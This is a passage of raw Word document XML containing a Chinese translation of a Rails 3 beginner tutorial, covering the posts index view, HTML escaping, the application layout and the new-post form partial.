                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>post.name %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48D0F1C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&lt;td&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>post.title %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12D762D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&lt;td&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>post.content %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BF790E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&lt;td&gt;&lt;%=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'Show', post %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="137E834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&lt;td&gt;&lt;%=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'Edit', edit_post_path(post) %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="777EE56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&lt;td&gt;&lt;%=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'Destroy', post, :confirm</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Are you sure?', :method</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :delete</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A346DF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&lt;/tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="286CC2F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6F7FD30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&lt;/table&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15CF527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4D9C5FF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031BAAA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576DB90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'New post', new_post_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="319952A4"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这个 view 迭代 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@posts</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 数组所有的内容并显示相关的内容和链接。关于视图备注一些信息：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6204389D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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rPr>
        <w:t>link_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建一个超链接到一个地方</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FCD379" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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rPr>
        <w:t>edit_post_path</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new_post_path</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是 Rails 提供的 RESTful 路由向导。你将会在不同 controller 看到一系列的不同的 actions helpers。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C49AD2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在以前的版本的 Rails 中，你必须使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%=h post.name %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 以避免一些HTML可能会在插入到页面之前转义。在 Rails 3.0，作为默认。得到一个非转义的 HTML，你现在使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= raw post.name %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7183EBE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了解更过关于渲染处理流程，阅读 </w:t>
      </w:r>
      <w:hyperlink r:id="rId89" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Layouts and Rendering in Rails</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFF0FF4"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9.8 定制布局</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101405A5"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view 仅仅告诉 HTML 在你的 web 浏览器里面要显示什么（内容）。Rails 也有关于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>layouts</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的概念（定义），那就是布局是对 view 的包装。当 Rails 渲染一个 view 到浏览器，它通常是这样做： 把 view 的 HTML 放进布局的 HTML 中。在以前的版本中，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令将会自动创建 controller 对应指定的布局，就像 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/layouts/posts.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对应于 posts controller。 然而在 rails3.0中有所不同了。一个应用程序指定的布局适用于所有的 controllers，可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/layouts/application.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中找到(这就好像是django的base.html)。打开这个 layout 在你的编辑器中并且修改 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>body</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 标签：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6336"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7EA71BDA" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B29441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&lt;!DOCTYPE html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2926D6B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&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5207FDB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&lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="179D9AD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&lt;title&gt;Blog&lt;/title&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="144A14E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stylesheet_link_tag "application"</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790FCF5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javascript_include_tag "application"</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6E92CB2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csrf_meta_tags %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10892D3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&lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7998E69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&lt;body</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>style="background-color: #EEEEEE;"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79D3AEA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w:t>
            </w:r>
            <w:r w:rsidRPr="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>yield</w:t>
            </w:r>
            <w:r w:rsidRPr="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48E0680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&lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6403BE4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&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BE482A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现在你刷新 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 页面，你将会看到一个灰色的页面背景。并且相同的灰色背景将会使用在 posts 的所有视图中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38749E94"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9.9 建立新文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF454E0"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创建一个 new post 包含两个 actions。首先是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action，它会实例化一个空的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="799A4F88" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74690FA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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D8A8AA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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46F614C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6988676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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30F44C2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format.html  # new.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2719B38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format.json  { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @post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20083F1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77685BE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2FEA119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这个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 视图显示这个空的 post 给用户：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="68648F93" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41B27B9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&lt;h1&gt;New post&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="773C3B9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render 'form'</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5CC7646D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="004713D8">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'Back', posts_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74E4DC68"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rPr>
        <w:t>&lt;%= render 'form' %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是我们第一个介绍的 Rails 的 partials。一个 partial 是一个 HTML 代码片段和 Ruby 代码的组合可以在多目标对象中重用。（类似于django的include ‘other.html’）。 在本例中， form 用于创建 new post，它相当于一个用于编辑一个 post 的表单，这个表单有一个 name text fields 和 title text fields 以及一个 content 的 text area 还有一个用于添加一个新的 post 或者更新已经存在的 post 的按钮。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE8721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如果你看一下 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>views/posts/_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个文件，你将会发现下面的内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7548BD24" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="126E0DB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form_for(@post) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2310D6C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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@post.errors.any? %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="580CA46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id="errorExplanation"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="780CC76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&lt;h2&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
